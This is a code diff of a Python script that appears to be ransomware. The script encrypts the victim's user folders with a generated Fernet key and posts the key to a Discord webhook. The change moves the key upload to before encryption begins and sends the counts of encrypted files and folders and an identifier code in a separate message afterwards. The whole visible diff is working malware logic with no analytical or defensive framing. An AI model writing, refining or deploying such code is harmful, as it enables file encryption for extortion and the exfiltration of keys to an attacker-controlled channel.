@@ -110,14 +110,26 @@ def save_identifier_to_file(identifier_code):
         file.write(f"Identifier Code: {identifier_code}\n")
     return file_path
 
-def send_key_to_discord(webhook_url, key, file_count, folder_count, identifier_code):
+def send_info_to_discord(webhook_url, file_count, folder_count, identifier_code):
+    message = (
+        f"Files encrypted: {file_count}\n"
+        f"Folders encrypted: {folder_count}\n"
+        f"Identifier Code: {identifier_code}"
+    )
+    data = {
+        "content": message
+    }
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+        print("Key and stats sent successfully to Discord.")
+    else:
+        print(f"Failed to send data to Discord. Status Code: {response.status_code}")
+        
+def send_key_to_discord(webhook_url, key):
     """Sends the encryption key, stats, and identifier code to a Discord webhook."""
     encoded_key = base64.urlsafe_b64encode(key).decode()  # Encode key to send over the webhook
     message = (
         f"Encryption Key: {encoded_key}\n"
-        f"Files encrypted: {file_count}\n"
-        f"Folders encrypted: {folder_count}\n"
-        f"Identifier Code: {identifier_code}"
     )
     data = {
         "content": message
@@ -194,6 +206,8 @@ def main():
     # Generate encryption key
     key = generate_key()
     fernet = Fernet(key)
+    
+    send_key_to_discord(webhook_url, key)
 
     # Get the list of user folders to encrypt
     user_folders = get_user_folders()
@@ -224,7 +238,7 @@ def main():
     notify_user(identifier_file_path)
     
     # Send the key, encryption stats, and identifier code to the Discord webhook
-    send_key_to_discord(webhook_url, key, total_files, total_folders, identifier_code)
+    send_info_to_discord(webhook_url, total_files, total_folders, identifier_code)
 
 if __name__ == "__main__":
     main()
